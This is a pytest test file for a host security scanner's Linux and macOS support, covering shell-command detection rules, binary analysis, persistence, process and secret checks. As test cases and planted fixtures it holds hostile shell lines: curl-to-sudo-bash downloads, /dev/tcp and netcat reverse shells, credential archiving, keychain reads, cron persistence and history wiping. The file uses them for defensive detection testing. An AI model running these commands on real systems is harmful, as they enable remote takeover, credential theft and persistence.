"""Linux and macOS support: shell rules, binary analysis, persistence, processes, secrets, tool pins.

Pure-logic tests run everywhere (including Windows). Tests that need a POSIX filesystem or real
system binaries are skipped on Windows.
"""
from __future__ import annotations

import os
import stat
import sys
from pathlib import Path

import pytest

from winsentinel import binfmt, osinfo, toolchain
from winsentinel.findings import ModuleResult
from winsentinel.modules import files
from winsentinel.shellrules import SHELL_RULES
from winsentinel.textrules import scan_text

posix_only = pytest.mark.skipif(sys.platform == "win32", reason="needs a POSIX system")
linux_only = pytest.mark.skipif(not sys.platform.startswith("linux"), reason="Linux only")
macos_only = pytest.mark.skipif(sys.platform != "darwin", reason="macOS only")


def _ids(text: str) -> set[str]:
    return {h.rule.id for h in scan_text(text, SHELL_RULES)}


# ---- shell rules (all platforms) -------------------------------------------

@pytest.mark.parametrize("text,rule", [
    ("curl -fsSL http://198.51.100.7/i.sh | sudo bash", "SH-PIPE-EXEC"),
    ("bash -i >& /dev/tcp/198.51.100.7/4444 0>&1", "SH-REVSHELL"),
    ("rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc 198.51.100.7 9001 > /tmp/f", "SH-REVSHELL"),
    ("echo " + "QUJD" * 20 + " | base64 -d | sh", "SH-DECODE-EXEC"),
    ("echo /tmp/.x.so > /etc/ld.so.preload", "SH-PRELOAD"),
    ("(crontab -l; echo '* * * * * /tmp/.u') | crontab -", "SH-PERSIST"),
    ("launchctl load ~/Library/LaunchAgents/com.x.plist", "SH-PERSIST"),
    ("unset HISTFILE; history -c", "SH-EVASION"),
    ("xattr -d com.apple.quarantine ./Installer.app", "SH-EVASION"),
    ("tar czf /tmp/k.tgz ~/.ssh/id_rsa ~/.aws/credentials", "SH-CREDS"),
    ("security find-generic-password -s Chrome -w", "SH-CREDS"),
    ("./xmrig -o stratum+tcp://pool.example:3333 --donate-level 1", "SH-MINER"),
    ("osascript -e 'do shell script \"/tmp/a\" with administrator privileges'", "SH-OSASCRIPT"),
])
def test_shell_rules_detect(text, rule):
    assert rule in _ids(text)


@pytest.mark.parametrize("text", [
    "#!/bin/sh\nset -e\ncd \"$(dirname \"$0\")\"\nmake -j4 && make install\n",
    "export PATH=\"$HOME/.local/bin:$PATH\"\nalias ll='ls -la'\n",
    "curl -fsSL https://example.com/file.tar.gz -o /tmp/file.tar.gz && tar xzf /tmp/file.tar.gz",
    "systemctl status nginx; journalctl -u nginx --since today",
])
def test_shell_rules_ignore_ordinary_scripts(text):
    assert _ids(text) == set()


# ---- file sniffing and binary analysis -------------------------------------

def test_sniff_elf_macho_shebang_and_java_class():
    assert files.sniff(b"\x7fELF\x02\x01\x01\x00", "") == "elf"
    assert files.sniff(b"\xcf\xfa\xed\xfe\x07\x00\x00\x01", ".png") == "macho"
    assert files.sniff(b"\xca\xfe\xba\xbe\x00\x00\x00\x02", "") == "macho"       # universal binary, 2 slices
    assert files.sniff(b"\xca\xfe\xba\xbe\x00\x00\x00\x41", ".class") is None    # Java class file (major 65)
    assert files.sniff(b"#!/bin/sh\n", "") == "script"
    assert files.sniff(b"plain text", ".sh") == "script"


def test_capability_mapping_and_signal_thresholds():
    caps = binfmt.capabilities({"ptrace", "process_vm_writev", "memfd_create", "socket", "printf"})
    assert {"process injection or tracing", "in-memory execution", "network"} <= set(caps)
    assert len(binfmt._signals(caps, "", [])) == 2                      # injection (2 symbols) + memfd
    lone = binfmt.capabilities({"ptrace", "mprotect"})
    assert binfmt._signals(lone, "", []) == []                          # debugger-like, not reportable
    assert any("packed" in s for s in binfmt._signals({}, "UPX!", []))


def test_malformed_elf_is_reported_not_crashing():
    info = binfmt.analyse_elf(b"\x7fELF" + b"\x00" * 40)
    assert info.get("parse_error") and info["signals"]


def test_macho_string_scan():
    blob = b"\xcf\xfa\xed\xfe" + b"\x00" * 64 + b"\x00_ptrace\x00_task_for_pid\x00_socket\x00/usr/lib/libSystem.B.dylib\x00"
    info = binfmt.analyse_macho(blob)
    assert "process injection or tracing" in info["capabilities_from_imports"]
    assert "/usr/lib/libSystem.B.dylib" in info["linked_libraries"]
    assert info["method"].startswith("string-table")


@posix_only
def test_real_system_binary_parses():
    data = Path("/bin/ls").read_bytes()
    if sys.platform == "darwin":
        info = binfmt.analyse_macho(data)
        assert info["symbol_count"] > 5
    else:
        info = binfmt.analyse_elf(data)
        assert info["import_count"] > 10 and info["sections"] and not info.get("parse_error")
    assert not any("injection" in s for s in info["signals"])


# ---- tool pins --------------------------------------------------------------

def test_every_platform_has_pinned_builds_with_hashes():
    for (name, _), builds in toolchain._BINARIES.items():
        for target in (("windows", "x64"), ("linux", "x64"), ("linux", "arm64"), ("macos", "x64"), ("macos", "arm64")):
            url, sha, kind = builds[target]
            assert url.startswith("https://github.com/") and len(sha) == 64 and kind in ("zip", "tgz", "raw"), (name, target)
    assert len({b[1] for builds in toolchain._BINARIES.values() for b in builds.values()}) == 20  # no copy-paste hashes
    assert {"gitleaks", "trufflehog", "osv-scanner", "trivy"} <= set(toolchain.TOOLS)


def test_module_set_matches_platform():
    from winsentinel.modules import REGISTRY, UNSUPPORTED

    assert {"persistence", "processes", "hardening", "files", "secrets", "vulns", "code", "ai-tooling", "iocs"} <= set(REGISTRY)
    if osinfo.OS == "windows":
        assert "defender" in REGISTRY and "av" in UNSUPPORTED
        assert REGISTRY["persistence"].__name__.endswith(".persistence")
    else:
        assert "av" in REGISTRY and "defender" in UNSUPPORTED
        assert REGISTRY["persistence"].__name__.endswith(".posix_persistence")


# ---- POSIX modules against planted fixtures ---------------------------------

@posix_only
def test_resolve_command_finds_program_and_script(tmp_path):
    from winsentinel.modules.posix_persistence import resolve_command

    script = tmp_path / "job.sh"
    script.write_text("#!/bin/sh\necho hi\n")
    prog, target = resolve_command(f"/bin/sh {script} --flag")
    assert prog == "/bin/sh" and target == str(script)
    prog, target = resolve_command("-/bin/sh -c 'echo hi'")
    assert prog == "/bin/sh" and target is None
    assert resolve_command("FOO=1 /nonexistent/thing --x") == (None, None)


@posix_only
def test_planted_persistence_entries_are_graded(tmp_path, monkeypatch):
    from winsentinel.modules import posix_persistence as pp

    evil = tmp_path / "update.sh"
    evil.write_text("#!/bin/sh\ncurl -s http://198.51.100.7/p | sh\nbash -i >& /dev/tcp/198.51.100.7/4444 0>&1\n")
    entries = [
        pp.Entry("cron", "crontab -l (current user)", "evil", f"/bin/sh {evil}", True),
        pp.Entry("cron", "/etc/cron.d/x", "inline", "/bin/sh -c 'curl -s http://198.51.100.7/a | sh'", False),
        pp.Entry("systemd unit", "/etc/systemd/system/ok.service", "ok.service", "/bin/ls /", False),
        pp.Entry("cron", "/etc/cron.d/y", "missing", "/opt/gone/agent --run", False),
    ]
    vouch = lambda paths, chunk=200: {p: {"status": "Valid", "signer": "dpkg:coreutils", "os_binary": True} for p in paths}
    monkeypatch.setattr(pp, "check_trust", vouch)
    res = ModuleResult("persistence")
    pp._analyse(res, entries, set())
    by = {f.details["key"]: f for f in res.findings}
    assert by["evil"].severity == "high" and any("SH-REVSHELL" in s for s in by["evil"].signals)
    assert by["inline"].severity == "medium"
    assert "ok.service" not in by                      # packaged program, nothing odd: not listed
    assert by["missing"].severity == "low" and "does not exist" in by["missing"].why
    assert res.coverage["autostart_entries_total"] == 4
    evil.unlink()  # do not leave a planted script in the temp dir for the next real scan to find


@posix_only
def test_process_assessment_flags_deleted_and_temp_executables(monkeypatch):
    from winsentinel.modules import posix_processes as pr

    monkeypatch.setattr(pr, "check_trust", lambda paths, chunk=200: {})
    procs = [
        {"pid": 10, "comm": "x", "cmd": "/tmp/.x", "exe": "/tmp/.x (deleted)", "uid": 1000},
        {"pid": 11, "comm": "sshd", "cmd": "/usr/sbin/sshd -D", "exe": "/usr/sbin/sshd (deleted)", "uid": 0},
        {"pid": 12, "comm": "bash", "cmd": "bash", "exe": "/usr/bin/bash", "uid": 1000},
    ]
    res = ModuleResult("processes")
    pr._assess(res, procs, set())
    assert len(res.findings) == 1
    f = res.findings[0]
    assert f.severity == "high" and "deleted" in f.why and "temporary" in f.why
    assert res.coverage["processes_on_replaced_binaries"] == 1   # upgraded sshd is counted, not flagged


@posix_only
def test_secret_exported_from_shell_rc_is_found_and_redacted(tmp_path, monkeypatch):
    from winsentinel.modules import secrets

    token = "sk_live_" + "9f8e7d6c5b4a39281706f5e4"
    (tmp_path / ".bashrc").write_text(f"export PATH=$HOME/bin:$PATH\nexport STRIPE_API_KEY={token}\nexport EDITOR=vim\n")
    monkeypatch.setattr(secrets.Path, "home", classmethod(lambda cls: tmp_path))
    res = ModuleResult("secrets")
    secrets._posix_environment(res)
    assert len(res.findings) == 1
    f = res.findings[0]
    assert "STRIPE_API_KEY" in f.title and f.evidence.endswith(".bashrc:2")
    assert token not in str(f.to_dict())


@posix_only
def test_hidden_script_in_tmp_is_found_by_file_scan(ctx):
    import tempfile

    d = Path(tempfile.mkdtemp(prefix="ws-fix-", dir="/tmp"))
    try:
        p = d / ".cache-update"
        p.write_text("#!/bin/sh\nbash -i >& /dev/tcp/198.51.100.7/4444 0>&1\n(crontab -l; echo '@reboot /tmp/.u') | crontab -\n")
        p.chmod(p.stat().st_mode | stat.S_IXUSR)
        ctx.paths = [d]
        res = files.run(ctx)
        by = {Path(f.evidence).name: f for f in res.findings}
        assert ".cache-update" in by, res.notes
        assert by[".cache-update"].severity == "high"
        assert any("SH-REVSHELL" in s for s in by[".cache-update"].signals)
    finally:
        import shutil

        shutil.rmtree(d, ignore_errors=True)


@posix_only
@pytest.mark.parametrize("module", ["persistence", "processes", "hardening", "av", "vulns"])
def test_host_modules_run_without_error(ctx, module):
    """Run each host module against the real machine: it must finish and report, whatever it finds."""
    from winsentinel.runner import run_modules

    res = run_modules(ctx, [module])[0]
    assert res.status in ("ok", "partial", "skipped"), res.notes
    assert all(f.severity in ("critical", "high", "medium", "low", "info") for f in res.findings)


@linux_only
def test_linux_trust_uses_package_ownership():
    from winsentinel.trust import check_trust

    out = check_trust(["/bin/ls", "/tmp"])
    assert out["/bin/ls"]["status"] in ("Valid", "Unknown", "Unpackaged")   # Unknown when no dpkg/rpm
    if out["/bin/ls"]["status"] == "Valid":
        assert out["/bin/ls"]["os_binary"] and out["/bin/ls"]["signer"].startswith(("dpkg:", "rpm:"))


@macos_only
def test_macos_trust_reads_code_signature():
    from winsentinel.trust import check_trust

    out = check_trust(["/bin/ls"])
    assert out["/bin/ls"]["status"] == "Valid" and out["/bin/ls"]["os_binary"]


def test_is_admin_returns_bool():
    assert isinstance(osinfo.is_admin(), bool)
    assert osinfo.ARCH in ("x64", "arm64") and osinfo.OS in ("windows", "linux", "macos")
    assert os.sep in str(Path.home())
